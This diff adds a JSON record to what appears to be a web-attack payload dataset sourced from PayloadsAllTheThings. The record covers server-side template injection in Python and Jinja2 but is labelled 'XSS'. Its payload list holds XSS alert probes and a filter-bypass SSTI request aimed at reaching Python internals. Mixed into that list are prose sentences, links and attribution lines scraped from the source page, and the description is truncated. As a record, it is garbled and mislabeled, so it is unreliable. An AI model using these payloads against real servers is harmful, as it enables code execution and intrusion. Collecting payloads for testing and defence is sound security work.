@@ -1,0 +1,27 @@
+{
+  "id": "xss-4012166e9286",
+  "category": "XSS",
+  "title": "Python",
+  "description": "# Server Side Template Injection - Python\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Universal Payloads](#universal",
+  "payloads": [
+    "{{ '<script>alert(3)</script>' }}",
+    "{{ '<script>alert(3)</script>' | safe }}",
+    "[Official website](https://jinja.palletsprojects.com/)",
+    "<li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>",
+    "<pre>{% debug %}</pre>",
+    "Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)",
+    "<dt>{{ key|e }}</dt>",
+    "<dd>{{ value|e }}</dd>",
+    "# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398",
+    "@after_this_request",
+    "We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):",
+    "With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:",
+    "Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls)",
+    "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).",
+    "http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Server Side Template Injection/Python.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
